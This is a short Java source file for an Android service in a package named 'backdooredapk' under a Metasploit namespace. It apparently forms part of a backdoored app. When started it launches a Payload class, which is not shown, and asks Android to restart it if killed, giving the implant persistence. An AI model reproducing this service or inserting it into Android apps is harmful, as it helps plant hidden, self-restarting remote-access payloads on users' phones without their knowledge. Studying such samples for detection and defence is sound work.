package stage.metasploit.com.backdooredapk;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class MyIntentService extends Service {
    public MyIntentService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Payload.start(this);
        // If we get killed, after returning from here, restart
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
